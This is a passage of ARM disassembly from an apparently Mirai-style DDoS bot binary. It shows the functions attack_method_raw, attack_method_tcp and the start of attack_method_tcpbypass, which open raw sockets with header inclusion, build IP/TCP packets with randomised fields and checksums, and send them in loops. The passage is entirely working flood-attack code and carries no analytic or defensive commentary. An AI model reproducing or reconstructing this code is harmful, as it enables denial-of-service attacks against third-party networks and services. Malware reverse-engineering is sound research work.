    b3b8:	eb002ef1 	bl	16f84 <__libc_sendto>
    b3bc:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b3c0:	e2830001 	add	r0, r3, #1
    b3c4:	e1500007 	cmp	r0, r7
    b3c8:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    b3cc:	baffffc0 	blt	b2d4 <attack_method_raw+0x49c>
    b3d0:	e3a03000 	mov	r3, #0
    b3d4:	e3570000 	cmp	r7, #0
    b3d8:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    b3dc:	0affffb7 	beq	b2c0 <attack_method_raw+0x488>
    b3e0:	eaffffba 	b	b2d0 <attack_method_raw+0x498>
    b3e4:	e5934010 	ldr	r4, [r3, #16]
    b3e8:	eb001c82 	bl	125f8 <rand_next>
    b3ec:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b3f0:	e1a01283 	lsl	r1, r3, #5
    b3f4:	e0411183 	sub	r1, r1, r3, lsl #3
    b3f8:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    b3fc:	e1a02c24 	lsr	r2, r4, #24
    b400:	e182242c 	orr	r2, r2, ip, lsr #8
    b404:	e0811008 	add	r1, r1, r8
    b408:	e2043cff 	and	r3, r4, #65280	; 0xff00
    b40c:	e5d1c014 	ldrb	ip, [r1, #20]
    b410:	e1822403 	orr	r2, r2, r3, lsl #8
    b414:	e1822c04 	orr	r2, r2, r4, lsl #24
    b418:	e0822c30 	add	r2, r2, r0, lsr ip
    b41c:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    b420:	e1a03c22 	lsr	r3, r2, #24
    b424:	e1833420 	orr	r3, r3, r0, lsr #8
    b428:	e2021cff 	and	r1, r2, #65280	; 0xff00
    b42c:	e1833401 	orr	r3, r3, r1, lsl #8
    b430:	e1833c02 	orr	r3, r3, r2, lsl #24
    b434:	e5853010 	str	r3, [r5, #16]
    b438:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    b43c:	e3730001 	cmn	r3, #1
    b440:	1affffae 	bne	b300 <attack_method_raw+0x4c8>
    b444:	eb001c6b 	bl	125f8 <rand_next>
    b448:	e3a04801 	mov	r4, #65536	; 0x10000
    b44c:	e585000c 	str	r0, [r5, #12]
    b450:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    b454:	e2444001 	sub	r4, r4, #1
    b458:	e1500004 	cmp	r0, r4
    b45c:	1affffac 	bne	b314 <attack_method_raw+0x4dc>
    b460:	eb001c64 	bl	125f8 <rand_next>
    b464:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    b468:	e1510004 	cmp	r1, r4
    b46c:	e1c500b4 	strh	r0, [r5, #4]
    b470:	1affffaa 	bne	b320 <attack_method_raw+0x4e8>
    b474:	eb001c5f 	bl	125f8 <rand_next>
    b478:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    b47c:	e1520004 	cmp	r2, r4
    b480:	e1c501b4 	strh	r0, [r5, #20]
    b484:	1affffa8 	bne	b32c <attack_method_raw+0x4f4>
    b488:	eb001c5a 	bl	125f8 <rand_next>
    b48c:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b490:	e1530004 	cmp	r3, r4
    b494:	e1c600b2 	strh	r0, [r6, #2]
    b498:	1affffa6 	bne	b338 <attack_method_raw+0x500>
    b49c:	eb001c55 	bl	125f8 <rand_next>
    b4a0:	e5860004 	str	r0, [r6, #4]
    b4a4:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    b4a8:	e1500004 	cmp	r0, r4
    b4ac:	1affffa4 	bne	b344 <attack_method_raw+0x50c>
    b4b0:	eb001c50 	bl	125f8 <rand_next>
    b4b4:	e35b0000 	cmp	fp, #0
    b4b8:	e5860008 	str	r0, [r6, #8]
    b4bc:	0affffa2 	beq	b34c <attack_method_raw+0x514>
    b4c0:	eb001c4c 	bl	125f8 <rand_next>
    b4c4:	e1c601b2 	strh	r0, [r6, #18]
    b4c8:	eaffff9f 	b	b34c <attack_method_raw+0x514>
    b4cc:	e1a0000a 	mov	r0, sl
    b4d0:	eb003a5a 	bl	19e40 <__GI___libc_close>
    b4d4:	e28dd074 	add	sp, sp, #116	; 0x74
    b4d8:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    b4dc:	e12fff1e 	bx	lr
    b4e0:	0002b8ac 	.word	0x0002b8ac

0000b4e4 <attack_method_tcp>:
    b4e4:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    b4e8:	e1a08001 	mov	r8, r1
    b4ec:	e24dd074 	sub	sp, sp, #116	; 0x74
    b4f0:	e3a01004 	mov	r1, #4
    b4f4:	e1a04002 	mov	r4, r2
    b4f8:	e1a05003 	mov	r5, r3
    b4fc:	e1a07000 	mov	r7, r0
    b500:	eb0031b5 	bl	17bdc <calloc>
    b504:	e1a01005 	mov	r1, r5
    b508:	e3a02002 	mov	r2, #2
    b50c:	e3a03000 	mov	r3, #0
    b510:	e1a09000 	mov	r9, r0
    b514:	e1a00004 	mov	r0, r4
    b518:	ebfffb88 	bl	a340 <attack_get_opt_int>
    b51c:	e3a03801 	mov	r3, #65536	; 0x10000
    b520:	e1a0c000 	mov	ip, r0
    b524:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b528:	e2433001 	sub	r3, r3, #1
    b52c:	e3a02003 	mov	r2, #3
    b530:	e1a01005 	mov	r1, r5
    b534:	e1a00004 	mov	r0, r4
    b538:	e58dc048 	str	ip, [sp, #72]	; 0x48
    b53c:	ebfffb7f 	bl	a340 <attack_get_opt_int>
    b540:	e1a01005 	mov	r1, r5
    b544:	e58d0024 	str	r0, [sp, #36]	; 0x24
    b548:	e3a02004 	mov	r2, #4
    b54c:	e3a03040 	mov	r3, #64	; 0x40
    b550:	e1a00004 	mov	r0, r4
    b554:	ebfffb79 	bl	a340 <attack_get_opt_int>
    b558:	e1a0c000 	mov	ip, r0
    b55c:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b560:	e1a01005 	mov	r1, r5
    b564:	e3a02005 	mov	r2, #5
    b568:	e3a03001 	mov	r3, #1
    b56c:	e1a00004 	mov	r0, r4
    b570:	e58dc050 	str	ip, [sp, #80]	; 0x50
    b574:	ebfffb71 	bl	a340 <attack_get_opt_int>
    b578:	e3a03801 	mov	r3, #65536	; 0x10000
    b57c:	e1a0c000 	mov	ip, r0
    b580:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b584:	e2433001 	sub	r3, r3, #1
    b588:	e3a02006 	mov	r2, #6
    b58c:	e1a01005 	mov	r1, r5
    b590:	e1a00004 	mov	r0, r4
    b594:	e58dc054 	str	ip, [sp, #84]	; 0x54
    b598:	ebfffb68 	bl	a340 <attack_get_opt_int>
    b59c:	e3a03801 	mov	r3, #65536	; 0x10000
    b5a0:	e1a01005 	mov	r1, r5
    b5a4:	e2433001 	sub	r3, r3, #1
    b5a8:	e3a02007 	mov	r2, #7
    b5ac:	e1a0b000 	mov	fp, r0
    b5b0:	e1a00004 	mov	r0, r4
    b5b4:	ebfffb61 	bl	a340 <attack_get_opt_int>
    b5b8:	e3a03801 	mov	r3, #65536	; 0x10000
    b5bc:	e1a01005 	mov	r1, r5
    b5c0:	e2433001 	sub	r3, r3, #1
    b5c4:	e3a02011 	mov	r2, #17
    b5c8:	e1a06000 	mov	r6, r0
    b5cc:	e1a00004 	mov	r0, r4
    b5d0:	ebfffb5a 	bl	a340 <attack_get_opt_int>
    b5d4:	e1a01005 	mov	r1, r5
    b5d8:	e58d0028 	str	r0, [sp, #40]	; 0x28
    b5dc:	e3a02012 	mov	r2, #18
    b5e0:	e3a03000 	mov	r3, #0
    b5e4:	e1a00004 	mov	r0, r4
    b5e8:	ebfffb54 	bl	a340 <attack_get_opt_int>
    b5ec:	e1a01005 	mov	r1, r5
    b5f0:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    b5f4:	e3a0200b 	mov	r2, #11
    b5f8:	e3a03000 	mov	r3, #0
    b5fc:	e1a00004 	mov	r0, r4
    b600:	ebfffb4e 	bl	a340 <attack_get_opt_int>
    b604:	e1a01005 	mov	r1, r5
    b608:	e58d0030 	str	r0, [sp, #48]	; 0x30
    b60c:	e3a0200c 	mov	r2, #12
    b610:	e3a03000 	mov	r3, #0
    b614:	e1a00004 	mov	r0, r4
    b618:	ebfffb48 	bl	a340 <attack_get_opt_int>
    b61c:	e1a01005 	mov	r1, r5
    b620:	e58d0034 	str	r0, [sp, #52]	; 0x34
    b624:	e3a0200d 	mov	r2, #13
    b628:	e3a03000 	mov	r3, #0
    b62c:	e1a00004 	mov	r0, r4
    b630:	ebfffb42 	bl	a340 <attack_get_opt_int>
    b634:	e1a01005 	mov	r1, r5
    b638:	e58d0038 	str	r0, [sp, #56]	; 0x38
    b63c:	e3a0200e 	mov	r2, #14
    b640:	e3a03000 	mov	r3, #0
    b644:	e1a00004 	mov	r0, r4
    b648:	ebfffb3c 	bl	a340 <attack_get_opt_int>
    b64c:	e1a01005 	mov	r1, r5
    b650:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    b654:	e3a0200f 	mov	r2, #15
    b658:	e3a03001 	mov	r3, #1
    b65c:	e1a00004 	mov	r0, r4
    b660:	ebfffb36 	bl	a340 <attack_get_opt_int>
    b664:	e1a01005 	mov	r1, r5
    b668:	e58d0040 	str	r0, [sp, #64]	; 0x40
    b66c:	e3a02010 	mov	r2, #16
    b670:	e3a03000 	mov	r3, #0
    b674:	e1a00004 	mov	r0, r4
    b678:	ebfffb30 	bl	a340 <attack_get_opt_int>
    b67c:	e59f2508 	ldr	r2, [pc, #1288]	; bb8c <attack_method_tcp+0x6a8>
    b680:	e58d0044 	str	r0, [sp, #68]	; 0x44
    b684:	e5923000 	ldr	r3, [r2]
    b688:	e1a01005 	mov	r1, r5
    b68c:	e3a02019 	mov	r2, #25
    b690:	e1a00004 	mov	r0, r4
    b694:	ebfffb0e 	bl	a2d4 <attack_get_opt_ip>
    b698:	e3a01003 	mov	r1, #3
    b69c:	e58d0060 	str	r0, [sp, #96]	; 0x60
    b6a0:	e3a02006 	mov	r2, #6
    b6a4:	e3a00002 	mov	r0, #2
    b6a8:	eb002e69 	bl	17054 <__GI_socket>
    b6ac:	e3700001 	cmn	r0, #1
    b6b0:	e1a0a000 	mov	sl, r0
    b6b4:	0a000131 	beq	bb80 <attack_method_tcp+0x69c>
    b6b8:	e28d3070 	add	r3, sp, #112	; 0x70
    b6bc:	e3a02001 	mov	r2, #1
    b6c0:	e5232004 	str	r2, [r3, #-4]!
    b6c4:	e3a0c004 	mov	ip, #4
    b6c8:	e3a01000 	mov	r1, #0
    b6cc:	e2822002 	add	r2, r2, #2
    b6d0:	e58dc000 	str	ip, [sp]
    b6d4:	eb002e4c 	bl	1700c <__GI_setsockopt>
    b6d8:	e3700001 	cmn	r0, #1
    b6dc:	0a000125 	beq	bb78 <attack_method_tcp+0x694>
    b6e0:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    b6e4:	e3a02000 	mov	r2, #0
    b6e8:	e1a00801 	lsl	r0, r1, #16
    b6ec:	e1a0480b 	lsl	r4, fp, #16
    b6f0:	e1a05806 	lsl	r5, r6, #16
    b6f4:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    b6f8:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    b6fc:	e1a03820 	lsr	r3, r0, #16
    b700:	e1a06824 	lsr	r6, r4, #16
    b704:	e1a01825 	lsr	r1, r5, #16
    b708:	e3570000 	cmp	r7, #0
    b70c:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    b710:	e58d6058 	str	r6, [sp, #88]	; 0x58
    b714:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    b718:	e202b0ff 	and	fp, r2, #255	; 0xff
    b71c:	0a000092 	beq	b96c <attack_method_tcp+0x488>
    b720:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b724:	e1a0e803 	lsl	lr, r3, #16
    b728:	e1a03c06 	lsl	r3, r6, #24
    b72c:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    b730:	e1a02c01 	lsl	r2, r1, #24
    b734:	e1a0140e 	lsl	r1, lr, #8
    b738:	e1a01821 	lsr	r1, r1, #16
    b73c:	e1a00c20 	lsr	r0, r0, #24
    b740:	e206c0ff 	and	ip, r6, #255	; 0xff
    b744:	e181ec2e 	orr	lr, r1, lr, lsr #24
    b748:	e180c40c 	orr	ip, r0, ip, lsl #8
    b74c:	e28d0030 	add	r0, sp, #48	; 0x30
    b750:	e8900003 	ldm	r0, {r0, r1}
    b754:	e1a03823 	lsr	r3, r3, #16
    b758:	e1a02822 	lsr	r2, r2, #16
    b75c:	e2000001 	and	r0, r0, #1
    b760:	e2011001 	and	r1, r1, #1
    b764:	e1836c24 	orr	r6, r3, r4, lsr #24
    b768:	e1825c25 	orr	r5, r2, r5, lsr #24
    b76c:	e58d000c 	str	r0, [sp, #12]
    b770:	e58d1010 	str	r1, [sp, #16]
    b774:	e28d2038 	add	r2, sp, #56	; 0x38
    b778:	e892000c 	ldm	r2, {r2, r3}
    b77c:	e28d0040 	add	r0, sp, #64	; 0x40
    b780:	e8900003 	ldm	r0, {r0, r1}
    b784:	e2022001 	and	r2, r2, #1
    b788:	e2033001 	and	r3, r3, #1
    b78c:	e2000001 	and	r0, r0, #1
    b790:	e2011001 	and	r1, r1, #1
    b794:	e58de064 	str	lr, [sp, #100]	; 0x64
    b798:	e58dc008 	str	ip, [sp, #8]
    b79c:	e58d2014 	str	r2, [sp, #20]
    b7a0:	e58d3018 	str	r3, [sp, #24]
    b7a4:	e58d001c 	str	r0, [sp, #28]
    b7a8:	e58d1020 	str	r1, [sp, #32]
    b7ac:	e3a04000 	mov	r4, #0
    b7b0:	e3a01001 	mov	r1, #1
    b7b4:	e3a00080 	mov	r0, #128	; 0x80
    b7b8:	eb003107 	bl	17bdc <calloc>
    b7bc:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    b7c0:	e7890104 	str	r0, [r9, r4, lsl #2]
    b7c4:	e1a03282 	lsl	r3, r2, #5
    b7c8:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    b7cc:	e0433182 	sub	r3, r3, r2, lsl #3
    b7d0:	e0830008 	add	r0, r3, r8
    b7d4:	e5d43000 	ldrb	r3, [r4]
    b7d8:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    b7dc:	e3833040 	orr	r3, r3, #64	; 0x40
    b7e0:	e5c43000 	strb	r3, [r4]
    b7e4:	e5d42000 	ldrb	r2, [r4]
    b7e8:	e3c2200a 	bic	r2, r2, #10
    b7ec:	e3822005 	orr	r2, r2, #5
    b7f0:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    b7f4:	e5c42000 	strb	r2, [r4]
    b7f8:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    b7fc:	e5c41001 	strb	r1, [r4, #1]
    b800:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    b804:	e3530000 	cmp	r3, #0
    b808:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    b80c:	e5c42008 	strb	r2, [r4, #8]
    b810:	e1c430b2 	strh	r3, [r4, #2]
    b814:	e3a03006 	mov	r3, #6
    b818:	e59d1008 	ldr	r1, [sp, #8]
    b81c:	13a02040 	movne	r2, #64	; 0x40
    b820:	e5c43009 	strb	r3, [r4, #9]
    b824:	11c420b6 	strhne	r2, [r4, #6]
    b828:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    b82c:	e584200c 	str	r2, [r4, #12]
    b830:	e5903010 	ldr	r3, [r0, #16]
    b834:	e1c410b4 	strh	r1, [r4, #4]
    b838:	e5843010 	str	r3, [r4, #16]
    b83c:	e1c461b4 	strh	r6, [r4, #20]
    b840:	e2841014 	add	r1, r4, #20
    b844:	e5d1300c 	ldrb	r3, [r1, #12]
    b848:	e5d1200d 	ldrb	r2, [r1, #13]
    b84c:	e59d000c 	ldr	r0, [sp, #12]
    b850:	e3c33050 	bic	r3, r3, #80	; 0x50
    b854:	e38330a0 	orr	r3, r3, #160	; 0xa0
    b858:	e3c22020 	bic	r2, r2, #32
    b85c:	e5c1300c 	strb	r3, [r1, #12]
    b860:	e1822280 	orr	r2, r2, r0, lsl #5
    b864:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    b868:	e5c1200d 	strb	r2, [r1, #13]
    b86c:	e5813004 	str	r3, [r1, #4]
    b870:	e5d1300d 	ldrb	r3, [r1, #13]
    b874:	e59d0010 	ldr	r0, [sp, #16]
    b878:	e3c33010 	bic	r3, r3, #16
    b87c:	e1833200 	orr	r3, r3, r0, lsl #4
    b880:	e5c1300d 	strb	r3, [r1, #13]
    b884:	e5d1200d 	ldrb	r2, [r1, #13]
    b888:	e59d3014 	ldr	r3, [sp, #20]
    b88c:	e3c22008 	bic	r2, r2, #8
    b890:	e1822183 	orr	r2, r2, r3, lsl #3
    b894:	e1c150b2 	strh	r5, [r1, #2]
    b898:	e5c1200d 	strb	r2, [r1, #13]
    b89c:	e5d1300d 	ldrb	r3, [r1, #13]
    b8a0:	e59d0018 	ldr	r0, [sp, #24]
    b8a4:	e3c33004 	bic	r3, r3, #4
    b8a8:	e1833100 	orr	r3, r3, r0, lsl #2
    b8ac:	e5c1300d 	strb	r3, [r1, #13]
    b8b0:	e5d1200d 	ldrb	r2, [r1, #13]
    b8b4:	e59d301c 	ldr	r3, [sp, #28]
    b8b8:	e3c22002 	bic	r2, r2, #2
    b8bc:	e1822083 	orr	r2, r2, r3, lsl #1
    b8c0:	e5c1200d 	strb	r2, [r1, #13]
    b8c4:	e5d1300d 	ldrb	r3, [r1, #13]
    b8c8:	e59d0020 	ldr	r0, [sp, #32]
    b8cc:	e3c33001 	bic	r3, r3, #1
    b8d0:	e1803003 	orr	r3, r0, r3
    b8d4:	e5c1300d 	strb	r3, [r1, #13]
    b8d8:	e3a02004 	mov	r2, #4
    b8dc:	e3a01002 	mov	r1, #2
    b8e0:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    b8e4:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    b8e8:	eb001b42 	bl	125f8 <rand_next>
    b8ec:	e200000f 	and	r0, r0, #15
    b8f0:	e2800e57 	add	r0, r0, #1392	; 0x570
    b8f4:	e2800008 	add	r0, r0, #8
    b8f8:	e1a00800 	lsl	r0, r0, #16
    b8fc:	e1a03420 	lsr	r3, r0, #8
    b900:	e2033cff 	and	r3, r3, #65280	; 0xff00
    b904:	e1833c20 	orr	r3, r3, r0, lsr #24
    b908:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    b90c:	e3a03004 	mov	r3, #4
    b910:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    b914:	e3a0200a 	mov	r2, #10
    b918:	e3a03008 	mov	r3, #8
    b91c:	e3a00002 	mov	r0, #2
    b920:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    b924:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    b928:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    b92c:	eb001b31 	bl	125f8 <rand_next>
    b930:	e3a02006 	mov	r2, #6
    b934:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    b938:	e3a01003 	mov	r1, #3
    b93c:	e3a03000 	mov	r3, #0
    b940:	e3a02001 	mov	r2, #1
    b944:	e5840030 	str	r0, [r4, #48]	; 0x30
    b948:	e5843034 	str	r3, [r4, #52]	; 0x34
    b94c:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    b950:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    b954:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    b958:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    b95c:	e0834002 	add	r4, r3, r2
    b960:	e1540007 	cmp	r4, r7
    b964:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    b968:	baffff90 	blt	b7b0 <attack_method_tcp+0x2cc>
    b96c:	e3a03000 	mov	r3, #0
    b970:	e3570000 	cmp	r7, #0
    b974:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    b978:	0afffffb 	beq	b96c <attack_method_tcp+0x488>
    b97c:	e1a00003 	mov	r0, r3
    b980:	e1a03280 	lsl	r3, r0, #5
    b984:	e0433180 	sub	r3, r3, r0, lsl #3
    b988:	e0833008 	add	r3, r3, r8
    b98c:	e5d32014 	ldrb	r2, [r3, #20]
    b990:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    b994:	e352001f 	cmp	r2, #31
    b998:	e2856014 	add	r6, r5, #20
    b99c:	9a00003b 	bls	ba90 <attack_method_tcp+0x5ac>
    b9a0:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    b9a4:	e3730001 	cmn	r3, #1
    b9a8:	0a000050 	beq	baf0 <attack_method_tcp+0x60c>
    b9ac:	e3a04801 	mov	r4, #65536	; 0x10000
    b9b0:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    b9b4:	e2444001 	sub	r4, r4, #1
    b9b8:	e1500004 	cmp	r0, r4
    b9bc:	0a000052 	beq	bb0c <attack_method_tcp+0x628>
    b9c0:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    b9c4:	e1510004 	cmp	r1, r4
    b9c8:	0a000054 	beq	bb20 <attack_method_tcp+0x63c>
    b9cc:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    b9d0:	e1520004 	cmp	r2, r4
    b9d4:	0a000056 	beq	bb34 <attack_method_tcp+0x650>
    b9d8:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b9dc:	e1530004 	cmp	r3, r4
    b9e0:	0a000058 	beq	bb48 <attack_method_tcp+0x664>
    b9e4:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    b9e8:	e1500004 	cmp	r0, r4
    b9ec:	0a00005a 	beq	bb5c <attack_method_tcp+0x678>
    b9f0:	e35b0000 	cmp	fp, #0
    b9f4:	1a00005c 	bne	bb6c <attack_method_tcp+0x688>
    b9f8:	e3a01000 	mov	r1, #0
    b9fc:	e1c510ba 	strh	r1, [r5, #10]
    ba00:	e1a00005 	mov	r0, r5
    ba04:	e3a01014 	mov	r1, #20
    ba08:	eb000b98 	bl	e870 <checksum_generic>
    ba0c:	e3a02000 	mov	r2, #0
    ba10:	e1c500ba 	strh	r0, [r5, #10]
    ba14:	e1a01006 	mov	r1, r6
    ba18:	e1c621b0 	strh	r2, [r6, #16]
    ba1c:	e3a03028 	mov	r3, #40	; 0x28
    ba20:	e3a02b0a 	mov	r2, #10240	; 0x2800
    ba24:	e1a00005 	mov	r0, r5
    ba28:	eb000ba4 	bl	e8c0 <checksum_tcpudp>
    ba2c:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    ba30:	e1a0e283 	lsl	lr, r3, #5
    ba34:	e1c601b0 	strh	r0, [r6, #16]
    ba38:	e04ee183 	sub	lr, lr, r3, lsl #3
    ba3c:	e1d660b2 	ldrh	r6, [r6, #2]
    ba40:	e08ee008 	add	lr, lr, r8
    ba44:	e1ce60b2 	strh	r6, [lr, #2]
    ba48:	e3a03901 	mov	r3, #16384	; 0x4000
    ba4c:	e3a0c010 	mov	ip, #16
    ba50:	e1a01005 	mov	r1, r5
    ba54:	e1a0000a 	mov	r0, sl
    ba58:	e3a0203c 	mov	r2, #60	; 0x3c
    ba5c:	e58de000 	str	lr, [sp]
    ba60:	e58dc004 	str	ip, [sp, #4]
    ba64:	eb002d46 	bl	16f84 <__libc_sendto>
    ba68:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    ba6c:	e2830001 	add	r0, r3, #1
    ba70:	e1500007 	cmp	r0, r7
    ba74:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    ba78:	baffffc0 	blt	b980 <attack_method_tcp+0x49c>
    ba7c:	e3a03000 	mov	r3, #0
    ba80:	e3570000 	cmp	r7, #0
    ba84:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    ba88:	0affffb7 	beq	b96c <attack_method_tcp+0x488>
    ba8c:	eaffffba 	b	b97c <attack_method_tcp+0x498>
    ba90:	e5934010 	ldr	r4, [r3, #16]
    ba94:	eb001ad7 	bl	125f8 <rand_next>
    ba98:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    ba9c:	e1a01283 	lsl	r1, r3, #5
    baa0:	e0411183 	sub	r1, r1, r3, lsl #3
    baa4:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    baa8:	e1a02c24 	lsr	r2, r4, #24
    baac:	e182242c 	orr	r2, r2, ip, lsr #8
    bab0:	e0811008 	add	r1, r1, r8
    bab4:	e2043cff 	and	r3, r4, #65280	; 0xff00
    bab8:	e5d1c014 	ldrb	ip, [r1, #20]
    babc:	e1822403 	orr	r2, r2, r3, lsl #8
    bac0:	e1822c04 	orr	r2, r2, r4, lsl #24
    bac4:	e0822c30 	add	r2, r2, r0, lsr ip
    bac8:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    bacc:	e1a03c22 	lsr	r3, r2, #24
    bad0:	e1833420 	orr	r3, r3, r0, lsr #8
    bad4:	e2021cff 	and	r1, r2, #65280	; 0xff00
    bad8:	e1833401 	orr	r3, r3, r1, lsl #8
    badc:	e1833c02 	orr	r3, r3, r2, lsl #24
    bae0:	e5853010 	str	r3, [r5, #16]
    bae4:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    bae8:	e3730001 	cmn	r3, #1
    baec:	1affffae 	bne	b9ac <attack_method_tcp+0x4c8>
    baf0:	eb001ac0 	bl	125f8 <rand_next>
    baf4:	e3a04801 	mov	r4, #65536	; 0x10000
    baf8:	e585000c 	str	r0, [r5, #12]
    bafc:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    bb00:	e2444001 	sub	r4, r4, #1
    bb04:	e1500004 	cmp	r0, r4
    bb08:	1affffac 	bne	b9c0 <attack_method_tcp+0x4dc>
    bb0c:	eb001ab9 	bl	125f8 <rand_next>
    bb10:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    bb14:	e1510004 	cmp	r1, r4
    bb18:	e1c500b4 	strh	r0, [r5, #4]
    bb1c:	1affffaa 	bne	b9cc <attack_method_tcp+0x4e8>
    bb20:	eb001ab4 	bl	125f8 <rand_next>
    bb24:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    bb28:	e1520004 	cmp	r2, r4
    bb2c:	e1c501b4 	strh	r0, [r5, #20]
    bb30:	1affffa8 	bne	b9d8 <attack_method_tcp+0x4f4>
    bb34:	eb001aaf 	bl	125f8 <rand_next>
    bb38:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    bb3c:	e1530004 	cmp	r3, r4
    bb40:	e1c600b2 	strh	r0, [r6, #2]
    bb44:	1affffa6 	bne	b9e4 <attack_method_tcp+0x500>
    bb48:	eb001aaa 	bl	125f8 <rand_next>
    bb4c:	e5860004 	str	r0, [r6, #4]
    bb50:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    bb54:	e1500004 	cmp	r0, r4
    bb58:	1affffa4 	bne	b9f0 <attack_method_tcp+0x50c>
    bb5c:	eb001aa5 	bl	125f8 <rand_next>
    bb60:	e35b0000 	cmp	fp, #0
    bb64:	e5860008 	str	r0, [r6, #8]
    bb68:	0affffa2 	beq	b9f8 <attack_method_tcp+0x514>
    bb6c:	eb001aa1 	bl	125f8 <rand_next>
    bb70:	e1c601b2 	strh	r0, [r6, #18]
    bb74:	eaffff9f 	b	b9f8 <attack_method_tcp+0x514>
    bb78:	e1a0000a 	mov	r0, sl
    bb7c:	eb0038af 	bl	19e40 <__GI___libc_close>
    bb80:	e28dd074 	add	sp, sp, #116	; 0x74
    bb84:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    bb88:	e12fff1e 	bx	lr
    bb8c:	0002b8ac 	.word	0x0002b8ac

0000bb90 <attack_method_tcpbypass>:
    bb90:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    bb94:	e1a08001 	mov	r8, r1
    bb98:	e24dd074 	sub	sp, sp, #116	; 0x74
    bb9c:	e3a01004 	mov	r1, #4
    bba0:	e1a04002 	mov	r4, r2
    bba4:	e1a05003 	mov	r5, r3
    bba8:	e1a07000 	mov	r7, r0
    bbac:	eb00300a 	bl	17bdc <calloc>
    bbb0:	e1a01005 	mov	r1, r5
    bbb4:	e3a02002 	mov	r2, #2
    bbb8:	e3a03000 	mov	r3, #0
    bbbc:	e1a09000 	mov	r9, r0
    bbc0:	e1a00004 	mov	r0, r4
    bbc4:	ebfff9dd 	bl	a340 <attack_get_opt_int>
    bbc8:	e3a03801 	mov	r3, #65536	; 0x10000
    bbcc:	e1a0c000 	mov	ip, r0
    bbd0:	e20cc0ff 	and	ip, ip, #255	; 0xff
    bbd4:	e2433001 	sub	r3, r3, #1
    bbd8:	e3a02003 	mov	r2, #3
    bbdc:	e1a01005 	mov	r1, r5
    bbe0:	e1a00004 	mov	r0, r4
    bbe4:	e58dc048 	str	ip, [sp, #72]	; 0x48
    bbe8:	ebfff9d4 	bl	a340 <attack_get_opt_int>
    bbec:	e1a01005 	mov	r1, r5
    bbf0:	e58d0024 	str	r0, [sp, #36]	; 0x24
    bbf4:	e3a02004 	mov	r2, #4
    bbf8:	e3a03040 	mov	r3, #64	; 0x40
    bbfc:	e1a00004 	mov	r0, r4
    bc00:	ebfff9ce 	bl	a340 <attack_get_opt_int>
    bc04:	e1a0c000 	mov	ip, r0
    bc08:	e20cc0ff 	and	ip, ip, #255	; 0xff
    bc0c:	e1a01005 	mov	r1, r5
    bc10:	e3a02005 	mov	r2, #5
    bc14:	e3a03001 	mov	r3, #1
    bc18:	e1a00004 	mov	r0, r4
